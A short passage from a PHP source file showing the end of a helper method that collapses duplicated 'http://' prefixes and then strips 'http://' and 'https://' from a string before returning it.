        $cont = str_replace('http://' . "\t" . 'http://', 'http://', trim($cont));
        $cont = str_replace('http://http://', 'http://', trim($cont));
        $cont = str_replace('http://http:// ', 'http://', trim($cont));
        $cont = str_replace('http://', '', trim($cont));
        $cont = str_replace('https://', '', trim($cont));
        return $cont;
    }
}


?>